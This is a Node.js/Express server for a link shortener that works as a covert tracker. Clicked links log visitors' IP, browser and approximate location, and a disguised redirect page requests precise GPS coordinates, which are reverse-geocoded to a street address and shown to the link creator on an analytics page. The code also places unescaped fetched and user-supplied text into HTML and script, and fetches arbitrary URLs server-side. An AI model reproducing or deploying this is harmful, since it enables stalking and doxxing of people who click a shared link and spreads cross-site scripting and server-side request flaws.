require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const geoip = require('geoip-lite');
const fetch = require('node-fetch');
const multer = require('multer');
const path = require('path');
const fs = require('fs').promises;

// Create Express app
const app = express();

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'public/uploads/')
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + path.extname(file.originalname))
  }
});
const upload = multer({ storage: storage });

// Enable trust proxy to get real IP when behind a proxy
app.set('trust proxy', true);

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Function to get real IP address
const getIpAddress = (req) => {
  // Try getting IP from various headers and fallback mechanisms
  return req.headers['x-forwarded-for']?.split(',')[0]
    || req.headers['x-real-ip']
    || req.connection.remoteAddress
    || req.socket.remoteAddress
    || req.ip
    || '127.0.0.1';
};

// MongoDB Connection
const connectDB = async () => {
  try {
    await mongoose.connect(`${process.env.MONGO_URI}`, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('Connected to MongoDB');
  } catch (err) {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  }
};
connectDB();

// Mongoose Schema for Links
const linkSchema = new mongoose.Schema({
  originalUrl: { type: String, required: true },
  shortCode: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now },
  ogTitle: { type: String },
  ogDescription: { type: String },
  ogImage: { type: String },
  clicks: [
    {
      ipAddress: String,
      userAgent: String,
      location: {
        country: String,
        city: String,
        region: String,
        timezone: String,
      },
      geo: Object,
      exactLocation: Object,
      timestamp: { type: Date, default: Date.now },
    },
  ],
});
const Link = mongoose.model('Link', linkSchema);

// Generate a random short code
const generateShortCode = () => Math.random().toString(36).substr(2, 8);

// Function to fetch OpenGraph metadata and save image
async function fetchOpenGraphMetadata(url) {
  try {
    const response = await fetch(url);
    const html = await response.text();
    
    // Basic parsing of OG tags
    const ogTitle = html.match(/<meta[^>]*property=["']og:title["'][^>]*content=["']([^"']*)["'][^>]*>/i)?.[1];
    const ogDescription = html.match(/<meta[^>]*property=["']og:description["'][^>]*content=["']([^"']*)["'][^>]*>/i)?.[1];
    const ogImageUrl = html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["'][^>]*>/i)?.[1];
    
    let ogImage = '';
    if (ogImageUrl) {
      try {
        const imageResponse = await fetch(ogImageUrl);
        if (imageResponse.ok) {
          const imageBuffer = await imageResponse.buffer();
          const imageExtension = ogImageUrl.split('.').pop().split('?')[0] || 'jpg';
          const imageName = `og-${Date.now()}.${imageExtension}`;
          const imagePath = path.join(__dirname, 'public', 'uploads', imageName);
          
          await fs.writeFile(imagePath, imageBuffer);
          ogImage = `/uploads/${imageName}`;
        }
      } catch (imageError) {
        console.error('Error saving OG image:', imageError);
      }
    }
    
    return {
      ogTitle: ogTitle || '',
      ogDescription: ogDescription || '',
      ogImage
    };
  } catch (error) {
    console.error('Error fetching OpenGraph metadata:', error);
    return { ogTitle: '', ogDescription: '', ogImage: '' };
  }
}

// Serve static files
app.use(express.static('public'));

// Serve the HTML file at the root route
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route to create a new short link
app.post('/api/create', async (req, res) => {
  const { originalUrl } = req.body;
  if (!originalUrl) {
    return res.status(400).json({ error: 'Original URL is required' });
  }

  const shortCode = generateShortCode();
  const customerLink = `${process.env.BASE_URL}/link/${shortCode}`;
  const analyticsLink = `${process.env.BASE_URL}/analytics/${shortCode}`;

  // Fetch OpenGraph metadata
  const ogMetadata = await fetchOpenGraphMetadata(originalUrl);

  const newLink = new Link({
    originalUrl,
    shortCode,
    ...ogMetadata
  });

  await newLink.save();

  res.json({
    message: 'Short links created successfully',
    customerLink,
    analyticsLink,
  });
});

// Route to redirect users to the original URL
app.get('/link/:shortCode', async (req, res) => {
  const { shortCode } = req.params;
  const link = await Link.findOne({ shortCode });

  if (!link) {
    return res.status(404).json({ error: 'Link not found' });
  }
  const ip = getIpAddress(req);
    const geo = geoip.lookup(ip === '::1' ? '127.0.0.1' : ip);

    const clickData = {
      ipAddress: ip,
      userAgent: req?.headers?.['user-agent'] || 'Unknown',
      location: geo
        ? {
            country: geo.country || 'Unknown',
            city: geo.city || 'Unknown',
            region: geo.region || 'Unknown',
            timezone: geo.timezone || 'Unknown',
          }
        : { country: 'Unknown', city: 'Unknown', region: 'Unknown', timezone: 'Unknown' },
      geo: geo || {},
      timestamp: new Date()
    };

    link.clicks.push(clickData);
    await link.save();
  // Build absolute URL for the OG image
  const ogImageUrl = link.ogImage ? `${process.env.BASE_URL}${link.ogImage}` : '';

  // Return HTML with OpenGraph metadata
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>${link.ogTitle || 'Redirecting...'}</title>
      <meta property="og:title" content="${link.ogTitle || ''}" />
      <meta property="og:description" content="${link.ogDescription || ''}" />
      ${ogImageUrl ? `<meta property="og:image" content="${ogImageUrl}" />` : ''}
      <meta property="og:url" content="${link.originalUrl}" />
      <meta property="og:type" content="website" />
      <meta http-equiv="refresh" content="0;url=/loc/${shortCode}">
      <style>
        body {
          font-family: Arial, sans-serif;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
          margin: 0;
          padding: 20px;
          text-align: center;
        }
        .preview {
          max-width: 600px;
          margin: 20px auto;
          padding: 20px;
          border: 1px solid #ccc;
          border-radius: 8px;
        }
        .preview img {
          max-width: 100%;
          height: auto;
          margin: 10px 0;
          border-radius: 4px;
        }
      </style>
    </head>
    <body>
      <div class="preview">
        <h1>${link.ogTitle || 'Redirecting...'}</h1>
        ${link.ogDescription ? `<p>${link.ogDescription}</p>` : ''}
        ${ogImageUrl ? `<img src="${ogImageUrl}" alt="${link.ogTitle || 'Preview'}" />` : ''}
        <p>Redirecting to ${link.originalUrl}...</p>
      </div>
    </body>
    </html>
  `);
});

app.get('/loc/:shortCode', async (req, res) => {
  const { shortCode } = req.params;
  const link = await Link.findOne({ shortCode });

  if (!link) {
    return res.status(404).json({ error: 'Link not found' });
  }
  res.send(`
    <html>
      <script>
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              };
              
              fetch('/api/location/${shortCode}', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify(location)
              }).finally(() => {
                window.location.href = '${link.originalUrl}';
              });
            },
            (error) => {
              console.log('Location error:', error.message);
              window.location.href = '${link.originalUrl}';
            },
            {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0
            }
          );
        } else {
          window.location.href = '${link.originalUrl}';
        }
      </script>
    </html>
  `);
});

// API endpoint to save user's location
app.post('/api/location/:shortCode', async (req, res) => {
  try {
    const { shortCode } = req.params;
    const link = await Link.findOne({ shortCode });

    if (!link) {
      return res.status(404).json({ error: 'Link not found' });
    }

    const { latitude, longitude } = req.body || {};
    if (!latitude || !longitude) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    const location = { latitude, longitude };
    // Get reverse geocoding data from OpenStreetMap
    const reverseGeoUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
    try {
      const response = await fetch(reverseGeoUrl, {
        headers: {
          'User-Agent': 'LinkShortener/1.0' // Required by Nominatim terms of use
        }
      });
      const geoData = await response.json();
      location.address = geoData.address;
      location.displayName = geoData.display_name;
    } catch (error) {
      console.error('Reverse geocoding error:', error);
    }
    const ip = getIpAddress(req);
    const geo = geoip.lookup(ip === '::1' ? '127.0.0.1' : ip);

    const clickData = {
      ipAddress: ip,
      userAgent: req?.headers?.['user-agent'] || 'Unknown',
      location: geo
        ? {
            country: geo.country || 'Unknown',
            city: geo.city || 'Unknown',
            region: geo.region || 'Unknown',
            timezone: geo.timezone || 'Unknown',
          }
        : { country: 'Unknown', city: 'Unknown', region: 'Unknown', timezone: 'Unknown' },
      geo: geo || {},
      exactLocation: location,
      timestamp: new Date()
    };

    link.clicks.push(clickData);
    await link.save();
    res.json({ message: 'Location saved successfully' });
  } catch (error) {
    console.error('Error saving location:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Route to view analytics for a specific short link
app.get('/analytics/:shortCode', async (req, res) => {
  const { shortCode } = req.params;
  const link = await Link.findOne({ shortCode });

  if (!link) {
    return res.status(404).send('<h1>Link not found</h1>');
  }

  // Serve the analytics HTML page
  res.sendFile(__dirname + '/analytics.html');
});

// API endpoint to fetch analytics data
app.get('/api/analytics/:shortCode', async (req, res) => {
  const { shortCode } = req.params;
  const link = await Link.findOne({ shortCode });

  if (!link) {
    return res.status(404).json({ error: 'Link not found' });
  }

  res.json({
    originalUrl: link.originalUrl,
    shortCode: link.shortCode,
    createdAt: link.createdAt,
    totalClicks: link.clicks.length,
    clicks: link.clicks,
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});